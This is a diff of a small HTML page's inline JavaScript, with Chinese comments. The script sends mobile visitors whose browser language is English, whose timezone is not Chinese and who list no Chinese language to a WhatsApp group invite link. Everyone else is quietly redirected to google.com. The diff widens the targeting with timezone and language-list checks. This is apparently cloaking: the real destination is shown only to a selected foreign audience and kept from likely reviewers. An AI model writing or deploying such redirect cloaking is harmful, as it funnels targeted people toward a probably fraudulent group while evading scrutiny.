@@ -7,28 +7,42 @@
 <body>
     <script>
         (function() {
+            // ========== 获取关键信息 ==========
+            
             // 1. 检测是否为手机端
-            function isMobile() {
-                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            }
-
-            // 2. 检测浏览器语言是否为英文
-            function isEnglish() {
-                var lang = navigator.language || navigator.userLanguage;
-                // 取前两位，判断是否为 'en'
-                return lang && lang.substr(0, 2).toLowerCase() === 'en';
-            }
-
-            // 定义跳转目标
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            // 2. 获取浏览器语言
+            var lang = navigator.language || navigator.userLanguage || '';
+            var langs = navigator.languages || [];
+            
+            // 3. 获取时区
+            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // ========== 判断条件 ==========
+            
+            // 4. 是否为英文
+            var isEnglish = lang.substr(0, 2).toLowerCase() === 'en';
+            
+            // 5. 是否为中国时区
+            var chinaTZ = ['Asia/Shanghai', 'Asia/Chongqing', 'Asia/Harbin', 'Asia/Urumqi'];
+            var isChinaTZ = chinaTZ.indexOf(tz) !== -1;
+            
+            // 6. 是否为中文语言
+            var isChineseLang = lang.startsWith('zh') || 
+                                langs.some(function(l) { return l.startsWith('zh'); });
+            
+            // ========== 最终决策 ==========
+            
+            // 目标：手机端 + 英文 + 不是中国时区 + 不是中文语言
+            var shouldRedirect = isMobile && isEnglish && !isChinaTZ && !isChineseLang;
+            
+            // ========== 跳转执行 ==========
+            
             var targetUrl = "https://chat.whatsapp.com/GzlyDzWSFu69fQfxaJbk0m";
             var fallbackUrl = "https://www.google.com";
-
-            // 执行条件判断：手机端 且 浏览器语言为英文
-            if (isMobile() && isEnglish()) {
-                window.location.replace(targetUrl);
-            } else {
-                window.location.replace(fallbackUrl);
-            }
+            
+            window.location.replace(shouldRedirect ? targetUrl : fallbackUrl);
         })();
     </script>
 </body>
